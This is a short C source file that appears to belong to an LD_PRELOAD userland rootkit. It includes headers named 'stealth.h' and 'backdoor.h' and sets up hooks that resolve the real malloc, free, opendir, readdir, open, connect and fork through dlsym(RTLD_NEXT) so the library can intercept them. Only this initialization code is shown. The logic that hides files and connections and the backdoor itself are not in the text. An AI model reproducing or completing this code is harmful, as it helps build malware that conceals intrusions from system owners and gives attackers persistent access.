#include "hooks.h"
#include "stealth.h"
#include "backdoor.h"
#include "config.h"

malloc_t o_malloc = NULL;
free_t o_free = NULL;
opendir_t o_opendir = NULL;
readdir_t o_readdir = NULL;
open_t o_open = NULL;
connect_t o_connect = NULL;
fork_t o_fork = NULL;

void init_hooks(void){
	static int init = 0;
	if(init) return;
	init = 1;

	o_malloc = (malloc_t)dlsym(RTLD_NEXT, "malloc");
	o_free = (free_t)dlsym(RTLD_NEXT, "free");
	o_opendir = (opendir_t)dlsym(RTLD_NEXT, "opendir");
	o_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
	o_open = (open_t)dlsym(RTLD_NEXT, "open");
	o_connect = (connect_t)dlsym(RTLD_NEXT, "connect");
	o_fork = (fork_t)dlsym(RTLD_NEXT, "fork");
}
